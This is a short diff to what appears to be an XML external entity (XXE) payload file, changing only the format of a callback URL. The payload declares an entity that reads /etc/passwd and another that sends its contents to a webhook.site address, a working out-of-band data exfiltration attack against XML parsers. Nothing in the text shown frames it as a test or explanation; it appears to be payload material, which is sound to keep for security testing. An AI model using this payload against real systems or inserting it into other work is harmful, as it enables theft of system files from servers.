@@ -2,7 +2,7 @@
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "https://webhook.site/930a6386-1441-4fc9-8896-84af2191a545/?%xxe;">
+<!ENTITY callhome SYSTEM "https://webhook.site/930a6386-1441-4fc9-8896-84af2191a545?%xxe;">
 ]
 >
 <foo>&callhome;</foo>
